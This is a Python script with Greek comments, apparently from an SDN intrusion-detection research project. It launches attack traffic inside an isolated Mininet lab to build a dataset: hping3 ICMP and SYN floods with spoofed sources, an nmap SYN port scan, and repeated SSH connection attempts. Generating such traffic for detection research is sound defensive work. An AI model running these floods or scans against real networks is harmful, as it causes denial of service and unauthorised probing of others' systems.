#!/usr/bin/env python3
"""
traffic_attack.py  (ΜΕΘΟΔΟΣ A)
------------------------------
Παράγει ΚΑΚΟΒΟΥΛΗ κίνηση μέσα στην απομονωμένη τοπολογία Mininet, ώστε να
συλλεχθούν ροές επίθεσης για το δικό σου dataset και να δοκιμαστεί το
live detection + mitigation του controller.

!!! ΣΗΜΑΝΤΙΚΟ — ΗΘΙΚΗ/ΑΣΦΑΛΕΙΑ !!!
Αυτά τα εργαλεία πρέπει να εκτελούνται ΑΠΟΚΛΕΙΣΤΙΚΑ μέσα στο εικονικό
εργαστηριακό περιβάλλον Mininet (απομονωμένο VM), ΠΟΤΕ σε πραγματικό δίκτυο
ή εναντίον συστημάτων χωρίς ρητή άδεια. Είναι μέρος αμυντικής έρευνας.

Τύποι επιθέσεων (όλες προς το θύμα h5 = 10.0.0.5, επιτιθέμενος h6):
  1. ICMP/UDP DDoS flood       -> hping3 flood
  2. TCP SYN flood (DoS)       -> hping3 -S --flood
  3. Port scan (Probe)         -> nmap ή hping3 σε εύρος θυρών
  4. Brute force (BFA)         -> επαναλαμβανόμενες προσπάθειες σύνδεσης (προσομοίωση)

ΑΠΑΙΤΗΣΕΙΣ:
    sudo apt install hping3 nmap
"""

import time
from mininet.net import Mininet
from mininet.log import setLogLevel, info

import sys, os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from topology import build_network


def attack_ddos_flood(attacker, victim_ip, duration=20):
    """ICMP/UDP flood — υψηλός ρυθμός μικρών πακέτων από spoofed IPs."""
    info("*** [ATTACK] DDoS flood (ICMP) προς το θύμα\n")
    # --flood: όσο πιο γρήγορα γίνεται, --rand-source: spoofed πηγές (μιμείται DDoS)
    attacker.cmd(f"timeout {duration} hping3 --icmp --flood --rand-source {victim_ip} "
                 f"> /tmp/attack_ddos.log 2>&1")
    info("*** [ATTACK] Ολοκληρώθηκε DDoS flood\n")


def attack_syn_flood(attacker, victim_ip, port=80, duration=20):
    """TCP SYN flood — half-open συνδέσεις, κλασικό DoS κατά του controller/host."""
    info("*** [ATTACK] TCP SYN flood (DoS)\n")
    attacker.cmd(f"timeout {duration} hping3 -S -p {port} --flood --rand-source {victim_ip} "
                 f"> /tmp/attack_syn.log 2>&1")
    info("*** [ATTACK] Ολοκληρώθηκε SYN flood\n")


def attack_port_scan(attacker, victim_ip):
    """Port scan (Probe) — ανίχνευση ανοιχτών θυρών."""
    info("*** [ATTACK] Port scan (Probe)\n")
    # αν υπάρχει nmap:
    attacker.cmd(f"nmap -sS -T4 -p 1-1024 {victim_ip} > /tmp/attack_scan.log 2>&1")
    # εναλλακτικά με hping3 (SYN scan σε εύρος θυρών):
    # attacker.cmd(f"hping3 -S --scan 1-1024 {victim_ip} > /tmp/attack_scan.log 2>&1")
    info("*** [ATTACK] Ολοκληρώθηκε port scan\n")


def attack_brute_force(attacker, victim_ip, duration=20):
    """
    Brute force (BFA) — προσομοίωση επαναλαμβανόμενων προσπαθειών σύνδεσης.
    Εδώ προσομοιώνεται με πολλές γρήγορες TCP συνδέσεις στη θύρα 22 (SSH).
    """
    info("*** [ATTACK] Brute force (BFA) — επαναλαμβανόμενες συνδέσεις\n")
    end = time.time() + duration
    while time.time() < end:
        # κάθε "προσπάθεια" = μία γρήγορη TCP σύνδεση
        attacker.cmd(f"hping3 -S -p 22 -c 5 {victim_ip} > /dev/null 2>&1")
    info("*** [ATTACK] Ολοκληρώθηκε brute force\n")


def main():
    setLogLevel("info")
    net, hosts = build_network()
    net.start()
    time.sleep(2)

    attacker = hosts["h6"]
    victim_ip = hosts["h5"].IP()

    info("\n*** ΕΝΑΡΞΗ ΣΕΝΑΡΙΟΥ ΕΠΙΘΕΣΕΩΝ (απομονωμένο εργαστήριο)\n\n")
    attack_port_scan(attacker, victim_ip)
    time.sleep(3)
    attack_syn_flood(attacker, victim_ip, duration=20)
    time.sleep(3)
    attack_ddos_flood(attacker, victim_ip, duration=20)
    time.sleep(3)
    attack_brute_force(attacker, victim_ip, duration=20)

    info("\n*** Όλες οι επιθέσεις ολοκληρώθηκαν.\n")
    net.stop()


if __name__ == "__main__":
    main()
